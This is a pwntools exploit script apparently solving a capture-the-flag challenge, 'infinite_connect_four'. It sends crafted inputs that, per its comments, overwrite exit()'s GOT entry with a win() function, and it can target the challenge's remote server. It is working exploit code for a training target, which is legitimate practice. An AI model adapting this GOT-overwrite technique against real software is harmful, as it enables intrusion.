#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./infinite_connect_four"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "challs.nusgreyhats.org"
  PORT = 33102
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.sendlineafter(b"> ", b"\xc9") 
s.sendlineafter(b"> ", b"\x5f") 

# got overwite exit() => win()
for i in range(8):
  s.sendlineafter(b"> ", b"0") 
  s.sendlineafter(b"> ", b"0") 

s.sendlineafter(b"> ", b"2") 

for i in range(8):
  s.sendlineafter(b"> ", b"1") 
  s.sendlineafter(b"> ", b"1") 

# call exit(win)
s.sendlineafter(b"> ", b"8") 
   
s.interactive() 
